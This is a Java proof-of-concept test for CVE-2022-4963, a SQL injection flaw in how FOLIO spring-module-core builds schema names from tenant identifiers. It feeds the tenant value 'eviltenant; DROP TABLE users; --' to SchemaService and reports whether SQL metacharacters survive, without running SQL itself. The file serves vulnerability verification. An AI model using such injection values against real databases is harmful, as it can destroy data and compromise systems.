import org.folio.spring.tenant.service.SchemaService;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * PoC for CVE-2022-4963 (FOLIO spring-module-core < 2.0.0).
 *
 * The vulnerable version lacks proper validation of the schema name that is
 * eventually concatenated into raw SQL statements such as "DROP SCHEMA IF
 * EXISTS ...".  By passing a tenant identifier that contains SQL
 * metacharacters an attacker can inject arbitrary commands.
 */
public class FolioSpringModuleCoreSQLiPoCTest {

    private static final String MALICIOUS_TENANT = "eviltenant; DROP TABLE users; --";
    private static final String SAFE_TENANT = "safetenant";

    public static void main(String[] args) {
        System.out.println("=== CVE-2022-4963 FOLIO spring-module-core PoC ===\n");
        System.out.println("This PoC demonstrates a SQL injection vulnerability in schema name generation.");
        System.out.println("When creating database schemas, the library concatenates tenant names into SQL queries.");
        System.out.println("A malicious tenant name containing SQL commands could lead to arbitrary SQL execution.\n");
        
        try {
            SchemaService service = new SchemaService();
            injectBuildInfo(service, "spring_module_core");

            boolean reproduced = testTenant(service, MALICIOUS_TENANT);
            testTenant(service, SAFE_TENANT);

            System.out.println("====================================================\n");
            if (reproduced) {
                System.out.println("RESULT: The vulnerability WAS reproduced. The generated schema contains SQL metacharacters and could be exploited.\n");
            } else {
                System.out.println("RESULT: The vulnerability was NOT reproduced. Generated schemas appear safe.\n");
            }

        } catch (Throwable t) {
            System.err.println("[ERROR] PoC execution failed: " + t);
            t.printStackTrace();
        }
    }

    private static void injectBuildInfo(SchemaService service, String artifact) throws Exception {
        // Obtain the target field inside SchemaService
        Field bipField = SchemaService.class.getDeclaredField("buildInfoProperties");
        bipField.setAccessible(true);

        // Build a minimal BuildInfoProperties instance via reflection
        Class<?> bipClass = Class.forName("org.folio.spring.tenant.properties.BuildInfoProperties");
        Object bipObject = bipClass.getConstructor().newInstance();

        // Try common setter first
        try {
            Method setter = bipClass.getMethod("setArtifact", String.class);
            setter.invoke(bipObject, artifact);
        } catch (NoSuchMethodException nsme) {
            // Fallback: set field directly
            Field artifactField = bipClass.getDeclaredField("artifact");
            artifactField.setAccessible(true);
            artifactField.set(bipObject, artifact);
        }

        // Finally wire the object into the service
        bipField.set(service, bipObject);
    }

    private static boolean testTenant(SchemaService service, String tenant) {
        try {
            String schema = service.getSchema(tenant);
            boolean looksMalicious = schema.contains(";") || schema.toLowerCase().contains("drop") || schema.toLowerCase().contains("create");
            if (looksMalicious) {
                System.out.println("[VULN] Generated schema name contains SQL metacharacters:");
                System.out.println("       Input tenant: " + tenant);
                System.out.println("       Generated schema: " + schema);
                System.out.println("       This schema name would be directly concatenated into SQL statements,");
                System.out.println("       potentially allowing SQL injection attacks.\n");
                return true;
            } else {
                System.out.println("[SAFE] Schema generated for '" + tenant + "': " + schema);
                System.out.println("       Example SQL that would be executed: ");
                System.out.println("           DROP SCHEMA IF EXISTS " + schema + ";");
                System.out.println("       The schema name is safe to concatenate into SQL.\n");
                return false;
            }
        } catch (Throwable t) {
            System.out.println("[SAFE] Call rejected for tenant '" + tenant + "': " + t.getMessage() + "\n");
            return false;
        }
    }
}
